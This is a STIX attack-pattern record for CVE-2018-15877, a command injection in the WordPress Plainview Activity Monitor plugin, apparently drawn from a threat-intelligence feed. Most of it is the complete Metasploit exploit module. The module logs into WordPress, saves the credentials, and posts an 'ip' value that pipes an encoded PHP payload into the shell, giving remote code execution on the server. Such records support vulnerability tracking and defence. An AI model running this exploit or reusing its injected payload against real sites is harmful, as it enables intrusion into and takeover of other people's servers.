{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5c8ebbb0-7211-41b5-a06a-5a6ecf99b18a",
    "created": "2024-08-14T17:13:11.938542Z",
    "modified": "2024-08-14T17:13:11.938546Z",
    "name": "Wordpress Plainview Activity Monitor RCE",
    "description": " Plainview Activity Monitor Wordpress plugin is vulnerable to OS command injection which allows an attacker to remotely execute commands on underlying system. Application passes unsafe user supplied data to ip parameter into activities_overview.php. Privileges are required in order to exploit this vulnerability.  Vulnerable plugin version: 20161228 and possibly prior Fixed plugin version: 20180826 ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/wp_plainview_activity_monitor_rce.rb",
            "external_id": "wp_plainview_activity_monitor_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-15877"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  include Msf::Exploit::Remote::HttpClient\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  Rank = ExcellentRanking\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Wordpress Plainview Activity Monitor RCE',\n      'Description'    => %q{\n          Plainview Activity Monitor Wordpress plugin is vulnerable to OS\n          command injection which allows an attacker to remotely execute\n          commands on underlying system. Application passes unsafe user supplied\n          data to ip parameter into activities_overview.php.\n          Privileges are required in order to exploit this vulnerability.\n\n          Vulnerable plugin version: 20161228 and possibly prior\n          Fixed plugin version: 20180826\n      },\n      'Author'\t=>\n        [\n          'LydA(c)ric LEFEBVRE', # Vulnerability discovery\n          'Leo LE BOUTER', # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2018-15877' ],\n          [ 'EDB', '45274' ],\n        ],\n      'Privileged'     => false,\n      'Platform'       => ['php'],\n      'Arch'           => ARCH_PHP,\n      'Payload'        =>\n        {\n          'BadChars' => '&>\\'',\n        },\n      'Targets'        => [['WordPress', {}]],\n      'DisclosureDate' => '2018-08-26'\n      ))\n\n      register_options(\n        [\n          OptString.new('USERNAME', [ true,  \"The user to authenticate as\"]),\n          OptString.new('PASSWORD', [ true,  \"The password to authenticate with\" ])\n        ])\n  end\n\n  def check\n    unless wordpress_and_online?\n      vprint_error(\"#{target_uri} does not seeem to be Wordpress site\")\n      return CheckCode::Unknown\n    end\n    check_plugin_version_from_readme('plainview-activity-monitor', '20180826')\n  end\n\n  def exploit\n    user = datastore['USERNAME']\n    password = datastore['PASSWORD']\n\n    print_status(\"Trying to login...\")\n    cookie = wordpress_login(user, password)\n    if cookie.nil?\n      fail_with(Failure::NoAccess, \"#{peer} - Login wasn't successful\")\n    end\n    print_good(\"Login Successful\")\n    store_valid_credential(user: user, private: password, proof: cookie)\n\n    uri = normalize_uri(target_uri.path, 'wp-admin/admin.php')\n\n    vars_get = {\n      'page' => 'plainview_activity_monitor',\n      'tab'  => 'activity_tools'\n    }\n\n    vars_post = {\n      'ip'     => \"localhost | php -r '#{payload.encoded}'\",\n      'lookup' => 'Lookup',\n      'submit' => 'Submit request'\n    }\n\n    send_request_cgi(\n      'method'    => 'POST',\n      'cookie'    => cookie,\n      'uri'       => uri,\n      'vars_get'  => vars_get,\n      'vars_post' => vars_post\n    )\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-08-26",
    "x_mitre_platforms": [
        "['php']"
    ]
}